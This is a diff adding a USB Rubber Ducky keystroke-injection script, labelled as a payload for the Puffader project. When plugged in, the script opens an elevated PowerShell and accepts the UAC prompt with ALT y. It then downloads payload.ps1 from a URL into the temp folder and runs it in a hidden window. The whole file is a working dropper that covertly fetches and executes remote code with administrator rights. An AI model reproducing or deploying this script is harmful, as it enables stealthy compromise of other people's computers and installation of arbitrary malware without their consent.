@@ -1,0 +1,27 @@
+REM Puffader USB Rubber Ducky Payload
+REM https://github.com/xp4xbox/Puffader
+REM NOTE: Delays may need to be modified for very slow computers
+DELAY 1000
+GUI r
+DELAY 800
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 2000
+REM Set Direct URL for payload.ps1
+STRING $url = ""
+DELAY 200
+ENTER
+DELAY 200
+STRING $TEMP = "$env:temp"; (New-Object System.Net.WebClient).DownloadFile($url, "$TEMP\payload.ps1")
+DELAY 500
+ENTER
+DELAY 1000
+STRING start-process powershell -WindowStyle Hidden "$TEMP\payload.ps1"
+DELAY 200
+ENTER
+DELAY 800
+STRING exit
+DELAY 100
+ENTER
